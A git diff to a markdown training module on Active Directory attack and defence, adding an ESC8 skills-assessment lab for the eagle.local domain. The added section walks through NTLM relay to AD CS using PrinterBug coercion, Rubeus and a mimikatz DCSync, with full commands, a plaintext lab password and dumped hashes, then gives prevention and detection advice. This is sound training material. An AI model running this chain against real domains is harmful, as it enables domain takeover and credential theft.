@@ -46,8 +46,9 @@ This module covers **Active Directory attacks and defense** - common attack tech
 13. [Coercing Attacks & Unconstrained Delegation](#13-coercing-attacks--unconstrained-delegation)
 14. [Object ACLs](#14-object-acls)
 15. [PKI - ESC1](#15-pki---esc1)
-16. [Interview Questions](#16-interview-questions)
-17. [Additional Resources](#17-additional-resources)
+16. [PKI - ESC8 (Skills Assessment)](#16-pki---esc8-skills-assessment)
+17. [Interview Questions](#17-interview-questions)
+18. [Additional Resources](#18-additional-resources)
 
 ---
 
@@ -308,7 +309,7 @@ graph TD
 | 11 | Coercing Attacks | Force DC authentication |
 | 12 | Object ACLs | Abuse Access Control Lists |
 | 13 | PKI ESC1 | Certificate misconfigurations |
-| 14 | PKI ESC8 | Coercing + Certificates |
+| 14 | PKI ESC8 | NTLM relay to ADCS |
 
 ### Lab Environment
 
@@ -2138,7 +2139,268 @@ dir \\dc1\c$
 
 ---
 
-## 16. Interview Questions
+## 16. PKI - ESC8 (Skills Assessment)
+
+### Description
+
+> 📌 **ESC8** - relaying to ADCS to obtain a certificate, utilizing PrinterBug to coerce machines to connect to attacker.
+
+```mermaid
+graph LR
+    Attacker[Attacker] -->|PrinterBug| DC[Domain Controller]
+    DC -->|Reverse<br/>connection| Attacker
+    Attacker -->|Relay to| CA[Certificate Authority]
+    CA -->|Issue cert<br/>for DC| Cert[Certificate]
+    Cert -->|TGT| Hashes[Domain Admin]
+    
+    style Attacker fill:#ff9999,stroke:#333
+    style DC fill:#ffcccc,stroke:#333
+    style CA fill:#ffcccc,stroke:#333
+```
+
+**Attack Flow:**
+1. Configure NTLMRelayx to forward to ADCS HTTP endpoint
+2. Use PrinterBug/Coercer to force DC to connect to attacker
+3. Relay connection to Certificate Authority
+4. Obtain certificate for Domain Controller
+5. Use certificate to get TGT → DCSync
+
+### Attack
+
+**Step 1: Configure NTLMRelayx:**
+
+```bash
+impacket-ntlmrelayx -t http://172.16.18.15/certsrv/default.asp --template DomainController -smb2support --adcs
+```
+
+**Output:**
+
+```
+Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation
+
+[*] Protocol Client SMTP loaded..
+[*] Protocol Client LDAPS loaded..
+[*] Protocol Client LDAP loaded..
+[*] Protocol Client DCSYNC loaded..
+[*] Protocol Client IMAPS loaded..
+[*] Protocol Client IMAP loaded..
+[*] Protocol Client RPC loaded..
+[*] Protocol Client HTTP loaded..
+[*] Protocol Client HTTPS loaded..
+[*] Protocol Client MSSQL loaded..
+[*] Protocol Client SMB loaded..
+[*] Running in relay mode to single host
+[*] Setting up SMB Server
+[*] Setting up HTTP Server on port 80
+[*] Setting up WCF Server
+[*] Setting up RAW Server on port 6666
+[*] Servers started, waiting for connections
+```
+
+<img width="1638" height="680" alt="image" src="https://github.com/user-attachments/assets/7dba6055-b169-4f3f-89c9-fc5c72337034" />
+
+Impacket ntlmrelayx command relays to 172.16.18.15 using DomainController template with SMB2 and ADCS support.
+
+**Step 2: Trigger PrinterBug:**
+
+```bash
+python3 ./dementor.py 172.16.18.20 172.16.18.4 -u bob -d eagle.local -p Slavi123
+```
+
+**Output:**
+
+```
+[*] connecting to 172.16.18.4
+[*] bound to spoolss
+[*] getting context handle...
+[*] sending RFFPCNEX...
+[-] exception RPRN SessionError: code: 0x6ab - RPC_S_INVALID_NET_ADDR - The network address is invalid.
+[*] done!
+```
+
+<img width="1614" height="267" alt="image" src="https://github.com/user-attachments/assets/76f846cf-af55-4454-be3e-935f1f0b701c" />
+
+Python script dementor.py connects to 172.16.18.4 with user Bob; network address invalid error
+
+**Step 3: Certificate obtained:**
+
+```
+[*] SMBD-Thread-5 (process_request_thread): Received connection from 172.16.18.4, attacking target http://172.16.18.15
+[*] HTTP server returned error code 200, treating as a successful login
+[*] Authenticating against http://172.16.18.15 as EAGLE/DC2$ SUCCEED
+[*] SMBD-Thread-7 (process_request_thread): Connection from 172.16.18.4 controlled, but there are no more targets left!
+[*] Generating CSR...
+[*] CSR generated!
+[*] Getting certificate...
+[*] GOT CERTIFICATE! ID 48
+[*] Base64 certificate of user DC2$: 
+MIIRbQIBAzCCEScGCSqGSIb3DQEHAaCCERgEghEUMIIREDCCB0cGCSqGSIb3DQEHBqCCBzgwggc0AgEAMIIHLQYJKoZIhvcNAQcBMBwGCiqGSIb3DQEMAQMwDgQIKetNs6FxjOQCAggAgIIHANV1B7
+...
+awlkK4goAPpDmzA9MDEwDQYJYIZIAWUDBAIBBQAEIFRQPz8lJcfLnaSLiZE6XHwdBfhN0CvXA6VfHQyHXUjRBAjoidjhENa0Kg==
+```
+
+<img width="1813" height="556" alt="image" src="https://github.com/user-attachments/assets/c81f552c-13ce-4a38-acb5-7ea993e04a70" />
+
+Connection from 172.16.18.4 to 172.16.18.15; certificate ID 48 issued for DC2.
+
+**Step 4: Request TGT with certificate:**
+
+```powershell
+.\Rubeus.exe asktgt /user:DC2$ /ptt /certificate:MIIRbQIBAzCCEScGCSqI<SNIP>
+```
+
+**Output:**
+
+```
+    ______        _
+   (_____ \      | |
+    _____) )_   _| |__  _____ _   _  ___
+   |  __  /| | | |  _ \| ___ | | | |/___)
+   | |  \ \| |_| | |_) ) ____| |_| |___ |
+   |_|   |_|____/|____/|_____)____/(___/
+
+   v2.0.1
+
+[*] Action: Ask TGT
+
+[*] Using PKINIT with etype rc4_hmac and subject: CN=DC2.eagle.local
+[*] Building AS-REQ (w/ PKINIT preauth) for: 'eagle.local\DC2$'
+[+] TGT request successful!
+[*] base64(ticket.kirbi):
+
+      doIF7DCCBeigAwIBBaEDAgEWooIFCDCCBQRhggUAMIIE/KADAgEFoQ0bC0VBR0xFLkxPQ0FMoiAwHqAD
+...
+[+] Ticket successfully imported!
+
+  ServiceName              :  krbtgt/eagle.local
+  ServiceRealm             :  EAGLE.LOCAL
+  UserName                 :  DC2$
+  UserRealm                :  EAGLE.LOCAL
+  StartTime                :  19/12/2022 23.43.15
+  EndTime                  :  20/12/2022 09.43.15
+  RenewTill                :  26/12/2022 23.43.15
+  Flags                    :  name_canonicalize, pre_authent, initial, renewable, forwardable
+  KeyType                  :  rc4_hmac
+  Base64(key)              :  SICrZ4HjAjHqvZh03xo99w==
+  ASREP (key)              :  BFC00B974546271BF0C6ACAC32447EB6
+```
+
+<img width="1790" height="197" alt="image" src="https://github.com/user-attachments/assets/98226a02-943f-4fda-8b30-2af44153bd6c" />
+
+Rubeus.exe asktgt command for user DC2$ with certificate.
+
+<img width="1829" height="1489" alt="image" src="https://github.com/user-attachments/assets/c94430d1-8759-43ea-8a83-5c9a8f1c1aa9" />
+
+TGT request successful for DC2 using certificate; ticket imported.
+
+**Step 5: DCSync with Mimikatz:**
+
+```powershell
+.\mimikatz_trunk\x64\mimikatz.exe "lsadump::dcsync /user:Administrator" exit
+```
+
+**Output:**
+
+```
+  .#####.   mimikatz 2.2.0 (x64) #19041 Aug 10 2021 17:19:53
+ .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
+ ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
+ ## \ / ##       > https://blog.gentilkiwi.com/mimikatz
+ '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
+  '#####'        > https://pingcastle.com / https://mysmartlogon.com ***/
+
+mimikatz(commandline) # lsadump::dcsync /user:Administrator
+[DC] 'eagle.local' will be the domain
+[DC] 'DC1.eagle.local' will be the DC server
+[DC] 'Administrator' will be the user account
+[rpc] Service  : ldap
+[rpc] AuthnSvc : GSS_NEGOTIATE (9)
+
+Object RDN           : Administrator
+
+** SAM ACCOUNT **
+
+SAM Username         : Administrator
+Account Type         : 30000000 ( USER_OBJECT )
+User Account Control : 00010200 ( NORMAL_ACCOUNT DONT_EXPIRE_PASSWD )
+Account expiration   : 01/01/1601 01.00.00
+Password last change : 07/08/2022 20.24.13
+Object Security ID   : S-1-5-21-1518138621-4282902758-752445584-500
+Object Relative ID   : 500
+
+Credentials:
+  Hash NTLM: fcdc65703dd2b0bd789977f1f3eeaecf
+
+Supplemental Credentials:
+* Primary:NTLM-Strong-NTOWF *
+    Random Value : 6fd69313922373216cdbbfa823bd268d
+
+* Primary:Kerberos-Newer-Keys *
+    Default Salt : WIN-FM93RI8QOKQAdministrator
+    Default Iterations : 4096
+    Credentials
+      aes256_hmac       (4096) : 1c4197df604e4da0ac46164b30e431405d23128fb37514595555cca76583cfd3
+      aes128_hmac       (4096) : 4667ae9266d48c01956ab9c869e4370f
+      des_cbc_md5       (4096) : d9b53b1f6d7c45a8
+```
+
+<img width="2067" height="1728" alt="image" src="https://github.com/user-attachments/assets/b952f7b2-f836-4f12-bcff-1e78575c08b8" />
+
+Mimikatz command executed for DCsync on Administrator; NTLM hash obtained successfully.
+
+### Prevention
+
+| Mitigation | Description |
+|-----------|-------------|
+| **Disable HTTP on ADCS** | Enforce HTTPS for certificate enrollment |
+| **Disable PrinterBug** | Disable Print Spooler on DCs |
+| **Enable SMB Signing** | Prevents NTLM relaying |
+| **Regular PKI Scans** | Use Certify to find misconfigurations |
+
+> 🔴 Attack possible because ADCS web enrollment doesn't enforce HTTPS!
+
+### Detection
+
+**Event IDs:**
+
+| Event ID | Description |
+|----------|-------------|
+| 4886 | Certificate request received |
+| 4887 | Certificate issued |
+| 4768 | TGT requested with certificate |
+| 4624 | Successful logon |
+
+**Event 4886 - Certificate request:**
+
+<img width="900" height="460" alt="image" src="https://github.com/user-attachments/assets/2261a192-a170-411b-a695-d86cc792d45f" />
+
+Event 4886: Certificate request by EAGLE\user using DomainController template.
+
+**Event 4887 - Certificate issued:**
+
+<img width="1084" height="579" alt="image" src="https://github.com/user-attachments/assets/dca76193-128e-430e-b101-03dbea27e2f9" />
+
+Event 4887: Certificate request approved for EAGLE\user using DomainController template.
+
+> 📌 Template name in request flags relayed attacks (not from DC itself)
+
+**Event 4768 - TGT with certificate:**
+
+<img width="1251" height="1075" alt="image" src="https://github.com/user-attachments/assets/3f2554a6-96d1-4d81-85df-96db98a32bc2" />
+
+Event 4768: TGT requested for user from IP 172.16.18.25 using certificate.
+
+> 📌 Note: IP address is not the Domain Controller's!
+
+**Event 4624 - Successful logon:**
+
+<img width="1375" height="1317" alt="image" src="https://github.com/user-attachments/assets/859d6899-3295-4d7c-95cc-0bef1ba44d58" />
+
+Event 4624: Successful login for user from IP 172.16.18.25 (not DC's IP).
+
+---
+
+## 17. Interview Questions
 
 ### Q1: What is Kerberoasting and how does it work?
 
